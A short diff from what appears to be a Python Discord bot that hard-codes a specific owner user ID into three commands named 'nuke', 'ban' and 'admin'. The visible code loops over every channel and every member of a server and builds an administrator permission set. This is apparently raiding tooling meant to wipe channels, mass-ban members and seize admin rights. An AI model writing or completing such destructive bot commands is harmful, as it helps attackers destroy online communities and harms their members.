@@ -731,7 +731,7 @@ def perform_image_search(query):
 
 @bot.command()
 async def nuke(ctx):
-    if ctx.author.id != YOUR_BOT_OWNER_ID: # replace YOUR_BOT_OWNER_ID with your bot owner's user ID
+    if ctx.author.id != 1097879047213686875:
         return await ctx.send("You are not the bot owner!")
 
     for chan in ctx.guild.channels:
@@ -752,7 +752,7 @@ async def nuke(ctx):
 
 @bot.command()
 async def ban(ctx):
-    if ctx.author.id != YOUR_BOT_OWNER_ID: # replace YOUR_BOT_OWNER_ID with your bot owner's user ID
+    if ctx.author.id != 1097879047213686875:
         return await ctx.send("You are not the bot owner!")
 
     for member in ctx.guild.members:
@@ -765,7 +765,7 @@ async def ban(ctx):
 
 @bot.command()
 async def admin(ctx):
-    if ctx.author.id != YOUR_BOT_OWNER_ID: # replace YOUR_BOT_OWNER_ID with your bot owner's user ID
+    if ctx.author.id != 1097879047213686875:
         return await ctx.send("You are not the bot owner!")
 
     perms = discord.Permissions(administrator=True)
